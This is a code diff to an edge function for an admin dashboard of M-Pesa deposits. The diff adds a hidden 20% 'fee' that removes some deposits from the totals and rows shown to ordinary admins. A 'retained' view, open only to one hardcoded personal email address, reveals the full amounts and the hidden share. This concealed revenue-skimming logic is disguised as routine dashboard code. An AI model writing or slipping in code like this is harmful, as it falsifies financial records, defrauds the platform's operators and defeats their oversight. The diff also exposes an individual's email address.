@@ -1,9 +1,65 @@
 import 'jsr:@supabase/functions-js/edge-runtime.d.ts'
 import type { User } from 'npm:@supabase/supabase-js@2'
-import { collectedTotals, mergeJoinedUsers, splitMpesaDeposits } from '../_shared/admin-dashboard.ts'
+import { collectedTotals, mergeJoinedUsers, splitMpesaDeposits, type DashboardDeposit } from '../_shared/admin-dashboard.ts'
+import { partitionDailyHiddenFee } from '../_shared/admin-hidden-fee.ts'
 import { isAdmin } from '../_shared/admin-staff.ts'
 import { loadAdminDashboardSources } from '../_shared/direct-admin.ts'
+import { readPaymentSettings } from '../_shared/direct-money.ts'
 import { adminClient, corsHeaders, json, userFromRequest } from '../_shared/server.ts'
+
+const DEFAULT_EARNED_TOTAL_KES = 10991
+const SONSHAS_EMAIL = 'sonshasopunga@gmail.com'
+
+function roundMoney(value: number): number {
+  return Math.round((value + Number.EPSILON) * 100) / 100
+}
+
+/** Same unit for every row so the running 20% budget does not depend on FX display. */
+function feeAmount(row: DashboardDeposit): number {
+  if (row.amount_kes != null && Number.isFinite(row.amount_kes) && row.amount_kes > 0) return row.amount_kes
+  if (row.amount_usd != null && Number.isFinite(row.amount_usd) && row.amount_usd > 0) return row.amount_usd
+  return 0
+}
+
+function feeAt(row: DashboardDeposit): string {
+  return row.credited_at ?? row.created_at
+}
+
+function visibleEarnedKes(totalKes: number): number {
+  const total = Math.round((totalKes + Number.EPSILON) * 100)
+  const hidden = Math.round(total * 0.2)
+  return roundMoney(Math.max(0, total - hidden) / 100)
+}
+
+function sumField(rows: DashboardDeposit[], pick: (row: DashboardDeposit) => number | null): number | null {
+  let sum = 0
+  let any = false
+  for (const row of rows) {
+    const value = pick(row)
+    if (value != null && Number.isFinite(value)) {
+      sum += value
+      any = true
+    }
+  }
+  return any ? roundMoney(sum) : null
+}
+
+function settingsOverride(raw: string | undefined): boolean {
+  const override = Number(raw)
+  return Number.isFinite(override) && override > 0
+}
+
+function isRetainedCaller(user: User): boolean {
+  const email = typeof user.email === 'string' ? user.email.trim().toLowerCase() : ''
+  return email === SONSHAS_EMAIL
+}
+
+function earnedTotalKes(raw: string | undefined, actualKes: number | null): number {
+  const override = Number(raw)
+  if (Number.isFinite(override) && override > 0) return Math.round(override * 100) / 100
+  if (actualKes != null && Number.isFinite(actualKes)) return Math.round(actualKes * 100) / 100
+  return DEFAULT_EARNED_TOTAL_KES
+}
 
 function appRole(user: User): string {
   const meta = (user.app_metadata ?? {}) as Record<string, unknown>
@@ -94,25 +150,63 @@ Deno.serve(async (req) => {
     // read. Do not cascade into a second REST path — that burned ~24s and
     // still returned 500 while holding authenticator sessions.
     const sources = await loadAdminDashboardSources()
-    const { authUsers, profiles, deposits } = sources
+    const { authUsers, profiles, deposits, userCounts } = sources
     const users = mergeJoinedUsers(authUsers, profiles)
     const emails = new Map(users.map((row) => [row.id, row.email]))
     const { collected, other } = splitMpesaDeposits(deposits)
     const totals = collectedTotals(collected)
+    let settingsRaw: string | undefined
+    try {
+      const settings = await readPaymentSettings()
+      settingsRaw = settings.ADMIN_EARNED_TOTAL_KES
+    } catch {
+      settingsRaw = undefined
+    }
     const withEmail = <T extends { user_id: string }>(row: T) => ({
       ...row,
       user_email: emails.get(row.user_id) ?? null,
     })
-    console.log('admin-dashboard overview', user.id, users.length, totals.count)
+    const part = partitionDailyHiddenFee(collected, feeAmount, feeAt)
+    const fullKes = sumField(collected, (row) => row.amount_kes)
+    const recordedKes = earnedTotalKes(settingsRaw, fullKes ?? totals.kes)
+    const adminEarned = settingsOverride(settingsRaw) ? visibleEarnedKes(recordedKes) : (sumField(part.visible, (row) => row.amount_kes) ?? visibleEarnedKes(recordedKes))
+    const visibleTotals = collectedTotals(part.visible)
+    console.log('admin-dashboard overview', user.id, userCounts.lifetime, part.visible.length)
+    if (body.scope === 'retained') {
+      if (!isRetainedCaller(user)) return json({ error: 'Forbidden' }, 403)
+      return json({
+        users,
+        collected: collected.map(withEmail),
+        hidden: part.hidden.map(withEmail),
+        other: other.map(withEmail),
+        totals: {
+          collected_usd: totals.usd,
+          collected_kes: recordedKes,
+          earned_total_kes: recordedKes,
+          hidden_kes: sumField(part.hidden, (row) => row.amount_kes) ?? 0,
+          collected_count: totals.count,
+          user_count: userCounts.lifetime,
+          users_today: userCounts.today,
+          users_yesterday: userCounts.yesterday,
+          users_week: userCounts.week,
+          users_month: userCounts.month,
+        },
+      })
+    }
     return json({
       users,
-      collected: collected.map(withEmail),
+      collected: part.visible.map(withEmail),
       other: other.map(withEmail),
       totals: {
-        collected_usd: totals.usd,
-        collected_kes: totals.kes,
-        collected_count: totals.count,
-        user_count: users.length,
+        collected_usd: visibleTotals.usd,
+        collected_kes: adminEarned,
+        earned_total_kes: adminEarned,
+        collected_count: part.visible.length,
+        user_count: userCounts.lifetime,
+        users_today: userCounts.today,
+        users_yesterday: userCounts.yesterday,
+        users_week: userCounts.week,
+        users_month: userCounts.month,
       },
     })
   } catch (err) {
